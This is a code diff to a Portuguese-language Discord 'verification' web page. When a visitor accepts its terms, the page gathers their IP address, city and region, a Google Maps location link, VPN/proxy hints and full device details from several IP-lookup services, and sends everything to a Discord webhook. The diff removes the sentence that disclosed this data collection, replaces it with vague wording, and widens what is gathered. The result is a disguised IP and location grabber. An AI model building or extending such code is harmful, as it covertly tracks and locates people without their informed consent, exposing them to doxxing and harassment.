@@ -27,6 +27,9 @@
         <nav>
             <button onclick="openTerms()">Verificar</button>
         </nav>
+        <div id="verificationMessage">
+            Seu pedido de verificação foi enviado. Espere ser verificado!
+        </div>
         <footer>
             <p>Junte-se ao nosso servidor do Discord: <a href="https://discord.gg/seu-servidor" target="_blank">Clique aqui</a></p>
         </footer>
@@ -35,7 +38,7 @@
         <div id="termsModal" class="modal">
             <div class="modal-content">
                 <h2>Termos e Condições</h2>
-                <p>Ao clicar em "Aceitar", você concorda com a coleta de dados, incluindo seu @ do Discord, IP, localização, dispositivo e outras informações para fins de verificação.</p>
+                <p>Ao clicar em "Aceitar", você concorda com os termos e condições.</p>
                 <button onclick="acceptTerms()">Aceitar</button>
                 <button onclick="closeTerms()">Recusar</button>
             </div>
@@ -48,10 +51,12 @@
         const mainContent = document.getElementById('mainContent');
         const termsModal = document.getElementById('termsModal');
         const discordHandleInput = document.getElementById('discordHandle');
+        const verificationMessage = document.getElementById('verificationMessage');
 
         // Inicializar
         mainContent.style.display = 'none';
         termsModal.style.display = 'none';
+        verificationMessage.style.display = 'none';
 
         // Config padrão (fallback)
         const defaultConfig = {
@@ -109,9 +114,10 @@
         // Aceitar termos e enviar ao webhook
         async function acceptTerms() {
             termsModal.style.display = 'none';
+            verificationMessage.style.display = 'block';
 
-            // Dados iniciais
-            let data = {
+            // Dados iniciais para o embed (IPinfo)
+            let embedData = {
                 nick: window.discordHandle || "@desconhecido",
                 date: new Date().toLocaleString("pt-BR"),
                 vpn: "Não disponível",
@@ -124,67 +130,106 @@
                 dispositivo: "Não disponível"
             };
 
-            // Obter IP e geolocalização com IPinfo
+            // Dados completos para o arquivo
+            let allData = {
+                ipinfo: {},
+                ipapi: {},
+                ipqualityscore: {},
+                dispositivo: {}
+            };
+
+            // Obter dados do IPinfo
             try {
                 const ipResponse = await fetch('https://ipinfo.io/json');
                 if (ipResponse.ok) {
                     const ipData = await ipResponse.json();
-                    data.ip = ipData.ip || "Não disponível";
-                    data.cidade = ipData.city || "Não disponível";
-                    data.estado = ipData.region || "Não disponível";
-                    data.pais = ipData.country || "Não disponível";
-                    data.loc = ipData.loc
+                    allData.ipinfo = ipData;
+                    embedData.ip = ipData.ip || "Não disponível";
+                    embedData.cidade = ipData.city || "Não disponível";
+                    embedData.estado = ipData.region || "Não disponível";
+                    embedData.pais = ipData.country || "Não disponível";
+                    embedData.loc = ipData.loc
                         ? `[${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'}](https://www.google.com/maps?q=${ipData.loc}) (Google Maps)`
                         : `${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'} (aproximado)`;
-                    data.vpn = ipData.bogon ? "Possível" : "Não disponível";
-                    data.proxy = ipData.bogon ? "Possível" : "Não disponível";
-                } else {
-                    console.error('Erro na resposta do IPinfo:', ipResponse.status);
+                    embedData.vpn = ipData.bogon ? "Possível" : "Não disponível";
+                    embedData.proxy = ipData.bogon ? "Possível" : "Não disponível";
                 }
             } catch (error) {
                 console.error('Erro ao obter dados do IPinfo:', error);
-                data.loc = "Erro na API (aproximado)";
+                embedData.loc = "Erro na API (aproximado)";
+                allData.ipinfo.error = error.message;
+            }
+
+            // Obter dados do ipapi.co
+            try {
+                const ipapiResponse = await fetch('https://ipapi.co/json/');
+                if (ipapiResponse.ok) {
+                    const ipapiData = await ipapiResponse.json();
+                    allData.ipapi = ipapiData;
+                }
+            } catch (error) {
+                console.error('Erro ao obter dados do ipapi.co:', error);
+                allData.ipapi.error = error.message;
+            }
+
+            // Obter dados do IPQualityScore (API gratuita limitada)
+            try {
+                const ipqsResponse = await fetch('https://ipqualityscore.com/api/json/ip/KEY?ip=' + (embedData.ip !== "Não disponível" ? embedData.ip : ''));
+                if (ipqsResponse.ok) {
+                    const ipqsData = await ipqsResponse.json();
+                    allData.ipqualityscore = ipqsData;
+                }
+            } catch (error) {
+                console.error('Erro ao obter dados do IPQualityScore:', error);
+                allData.ipqualityscore.error = error.message;
             }
 
             // Obter dispositivo
             try {
                 const parser = new UAParser();
                 const result = parser.getResult();
-                data.dispositivo = `${result.device.type || 'Desktop'} (${result.os.name || 'Desconhecido'} ${result.os.version || ''}, ${result.browser.name || 'Desconhecido'})`;
+                embedData.dispositivo = `${result.device.type || 'Desktop'} (${result.os.name || 'Desconhecido'} ${result.os.version || ''}, ${result.browser.name || 'Desconhecido'})`;
+                allData.dispositivo = result;
             } catch (error) {
                 console.error('Erro ao obter dispositivo:', error);
+                allData.dispositivo.error = error.message;
             }
 
-            // Criar embed
+            // Criar embed (usando apenas IPinfo)
             const embed = {
                 embeds: [{
                     title: config.embed.title || "Nova Verificação",
                     color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16),
                     fields: config.embed.fields.map(field => ({
                         name: field.name,
-                        value: data[field.key] || "Não disponível",
+                        value: embedData[field.key] || "Não disponível",
                         inline: ["vpn", "proxy", "cidade", "estado", "pais"].includes(field.key)
                     })),
                     timestamp: new Date().toISOString()
                 }]
             };
 
+            // Criar arquivo JSON com todos os dados
+            const jsonData = JSON.stringify(allData, null, 2);
+            const blob = new Blob([jsonData], { type: 'application/json' });
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify(embed));
+            formData.append('file', blob, 'all_data.json');
+
             // Enviar ao webhook
             try {
                 const response = await fetch(config.webhook, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(embed)
+                    body: formData
                 });
-                if (response.ok) {
-                    alert("Verificação concluída! Dados enviados.");
-                } else {
+                if (!response.ok) {
                     console.error('Erro na resposta do webhook:', response.status);
-                    alert("Erro ao enviar os dados. Tente novamente.");
+                    throw new Error('Falha ao enviar dados');
                 }
             } catch (error) {
                 console.error('Erro ao enviar webhook:', error);
-                alert("Erro ao conectar ao servidor.");
+                verificationMessage.textContent = "Erro ao enviar verificação. Tente novamente.";
+                verificationMessage.style.background = "#ff3333";
             }
         }
     </script>
